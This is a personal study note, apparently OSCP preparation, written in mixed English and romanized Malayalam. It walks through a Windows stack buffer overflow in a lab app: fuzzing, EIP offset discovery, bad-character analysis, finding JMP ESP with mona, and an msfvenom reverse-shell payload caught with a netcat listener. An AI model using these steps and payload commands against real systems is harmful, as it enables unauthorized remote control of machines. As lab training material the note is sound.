tib3rius(BOF) -->https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
oscp -->https://github.com/Tib3rius/Pentest-Cheatsheets
.reference-->https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/#:~:text=EIP%20offset%20is%20the%20exact%20value%20that%20gives,malicious%20code%20so%20that%20it%20could%20be%20executed.

There are two types of Buffer Overflow--**Heap Buffer Overflow**  ,  **Stack Buffer Overflow Attack**(most common)

Buffer Overflow works across different platforms including Linux, Windows and any other flavour out there because it deals with memory rather than what’s built on top of it.Since, dealing with memory registers in Linux can be a bit difficult to go head first, we make a smart choice of first understand the various steps and techniques of Buffer Overflow on a Windows Machine with an executable before moving on further.

Immunity Debugger is a tool that we can use for malware analysis, exploit writing and reverse engineering binary files. In this practical, we will use Immunity Debugger to see how buffer overflow occurs in a binary by analyzing the registers, hex values, memory addresses, etc.

                     =============== **EXERCISE (windows):**  ===============
-->first nammal immunity debugger eduth vulnerable app run chyyunu.ath paused statil ayirikum undavuka.so run chyuka.athil port 31337 listern chyunu enn kanikum.so ini namalude kaliyil varuka and make sure that port is runnng
-->nmap [target ip]
      Once it is confirmed that the application is listening on port 31337 we can move forward and check how the application functions. We will use Netcat to interact with the application.
-->nc [target ip] 31337
    ivide namuk test,enthengilum adikuka ok.Next, we will try to **fuzz** the application and see if we can crash it or not.
-->Here we are using a Fuzzer that generates a bunch of A’s (\x41) and sends it to our vulnerable application. The number of A’s is incremented every time because of a while loop present in the Fuzzer’s code. Fuzzer repeats the process until and unless it detects a crash in the application and couldn’t connect to it anymore.
-->fuzz chyunathin mumb immunity debuggeril poi app running thanne aano enn urapp varuthuka.oru python script und fuzz chyan.ath vechan fuzz chyunath.
-->After running the Fuzzer, we can see that the Fuzzer stopped after sending 160 bytes of data in the application
-->If we check the process state in Immunity Debugger, we could see that the application is in the paused state now. One more thing to be noticed is that the ESP register has overflown with A’s. This confirms that the application will crash if we send 160 A’s or 160 bytes of data in it.

**Registers**
  -   **EAX –** It is an accumulator register used to perform arithmetic calculations like add, subtract, compare and store the return values from function calls.
  -   **ECX –** This register acts like a counter used for iterations, it counts in a downward manner.
  -   **EDX –** This register holds extra data to perform complex calculations like multiply and divide. It acts as an extension of the EAX register.
  -   **EBX –** It is the base register that doesn’t have any defined purpose, it can be used to store data.
  -   **ESP –** It is the stack pointer. It indicates the location in the memory where the current instruction starts. It always points to the top of the stack.
  -   **EBP –** It is the base pointer that points to the base of the stack.
  -   **ESI –** It is known as the source index register which holds the location of the input data.
  -   **EDI –** It is the destination index register which points to the location where the result of the processed data is stored.
  -   **EIP –** It is the instruction pointer register. It is a read-only register that holds the address of the next instruction which is to be read.

                     =======  **Offset Discovery & Controlling EIP**  ==========
-->EIP offset is the exact value that gives us the information that how many bytes will fill the buffer and overflow into the return address (EIP).
-->Controlling the EIP is a very crucial part of buffer overflow attacks because EIP is the register that will ultimately point to our malicious code so that it could be executed. While fuzzing the application we saw that it was crashing at 160 bytes which means that EIP is located somewhere between 1 and 160 bytes. So, we will use a pattern creation tool in MSF which generates a **pattern** of certain bytes and it will lead us in finding the exact offset value. We will generate a pattern of 200 bytes. 40 bytes more for a little bit extra padding.
         --> msf-pattern_create -l 200
-->ee 20 bytes of data nammal oru python script il payload variablil aaki run chyunu.run chyunathin mumb aa app debuggeril restart chyuka ok.
            -->python exploit.py
-->Upon execution, the script will crash the application. We can confirm it by going back to our debugger.
-->ESP register now shows the pattern which we had sent to the application to crash it. Now if we look at the EIP register the value is **39654138**. We will use this value to find the EIP offset. To find it we will be using the pattern offset tool of MSF:
            -->msf-pattern_offset –l 200 –q 39654138
-->By using the above command, we found an exact match at offset 146. So, our EIP offset is **146**.
-->**Next, we will update our exploit code accordingly. As we now know the EIP offset value, we don’t need to send the pattern anymore. We can simply send 146 A’s in place of the pattern. We will send 4 B’s after 146 A’s as to ensure whether we can control the EIP or not. If the EIP register has 4 B’s after the execution of the exploit, then it will be confirmed that we can control the EIP now.**
-->so nammal python script il pinem update chyth payload = **A * 146 + eip(ie B *4*)** kodukunu
-->After updating the exploit code, we will run it again to check if we can control the EIP or not (don’t forget to re-run the application in Immunity Debugger before running the exploit).
-->As we can see in the above image, the EIP register has “42424242”. The hexadecimal value of ASCII character “B” is 0x42. So, it is confirmed at this point that we can control the EIP register.

                    =========== **Finding Bad Characters**  ===============
-->Bad characters are unwanted characters that break the shellcode. Finding and omitting the bad characters are necessary because bad characters terminate the string execution where ever they appear. If there is any bad character present in our shellcode in the end, then its execution will be stopped where ever the bad character is situated, so we will be omitting all the bad characters while generating our shellcode.
-->To find the bad characters we will first generate all characters with a python script and send it to the application to crash and analyze it. The code present below generates all characters from x01 to xff without x00 as x00 is a bad character by default. x00 is known as the null byte.
         -->script oke site il nokiyamthi ilengi tryhack me yil und.badchar.py enno matto peru iduka
-->ee x01 -xff vere ulla random characters nerthe pole script il itt veendum app crash aakuka ennit analyze chyuka
-->**After running the updated script, we will compare the hex dump of ESP with all characters to look for any bad character appearing in the memory. To do so, we will select ESP and then select follow in the dump.**
-->nammal code il ==b"A" * number +b "B" *4* +bad chars== ennan kodukunath.ie,==EAX+AIP+ESP==. esp il bad charecters kodukunath kondan follow in the dump select chyunath.ok. 
-->Now, if we compare the hex dump with all characters that we sent then we will see that everything is going pretty fine from 01 to 09 but after 09, 21 is there instead of 0A. This means that “\x0a” is a bad character.
           **hexadecimals-->1,2,3,4,5,6,7,8,9, and A,B,C,D,E,F**
-->Once we have found a bad character, we need to remove it from our exploit code and send it again to search for the next bad character. We need to repeat these steps until and unless our exploit is completely bad characters free.
-->Now that our exploit is bad characters free, we need to find out the JMP ESP.

                  ===== **JMP ESP(finding a jump point)**  ===============
-->when we execute a shellcode on a programm/application,we want to make sure that the EIP is pointing to our shellcode because that is the return address
-->if you want to execute a shell code,you need to find the adress of the shell code and then write the adress in the EIP __address___    
-->in an ideal senario,its really impossible to find out where in memory our shell code is.but ivide oru easy aaya reethi kanikunund ok.
-->in assembly there is an instruction-JMP ESP-means that jump the point of execution to the esp and continue executing whatever is there or whatever is pointed by the ESP.
--> **When an access violation occurs, the ESP register points to memory which contains the data which we had sent to the application. JMP ESP Instruction is used to redirect the code execution to that location. To find the JMP ESP we need to use a module of mona with –cpb option and all the bad characters that we found earlier, this will avoid mona returning memory pointer having bad characters. After running the command we need to open up log data.
                               -->!mona jmp -r esp -cpb "\x00\x0a"**
-->This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).
-->Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.
-->Once we open up the log data window, we can see in the below image that mona has found 2 pointers. Both the pointers are having all the security mitigations like ASLR, Rebase, SafeSEH turned off. So, we will choose one of the pointers and follow it in disassembler.
-->Once we hit “Follow in Disassembler” the CPU-thread window will open up again.we have found the JMP ESP address to be **080414C3**.ee address(number) nammal python script il iduka.idumbol sredhikuka O.S architechture anusarich idanam.x86(32 bit processors)aanenkil reverse aayi idanam , x64 aanenkil nere thane ital mathi

             =============== **Prepend NOPs** ====================
-->Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:
      -->padding = "\x90" * 16 (pading um oru variable aan python script le)
	  
               =============== **Generate Payload**  ===============
-->Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
     -->msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
	 here we use -f c because we need it to be c file and it is important
-->Copy the generated C code strings and integrate them into your exploit.py script payload variable.

**Final Exploit**
-->Now that we have generated our shellcode as well, it’s time that we make all the necessary changes in our exploit and make it ready to gain a reverse shell. We don’t need all characters now. We will insert our generated shellcode in place of “allchars”. So, the basic architecture of our exploit will be  **146 A’s as junk value + JMP ESP + NOPs + Shellcode.**
-->-->**b "A" *2012 + b"\address..\..\" +b "\x90" * 32 +payload(created from msfvenom)**
      ingane aan python script il reverse shell kitan vendi idendath

                 ===============  **Reverse Shell**  ===============
-->Since, we have already done all the necessary steps that were required to get a --reverse shell, now we can just start the Netcat listener on port 4444 and run the exploit. As we can see in the image, we successfully exploited the buffer overflow vulnerability present in the application and gained a reverse shell.



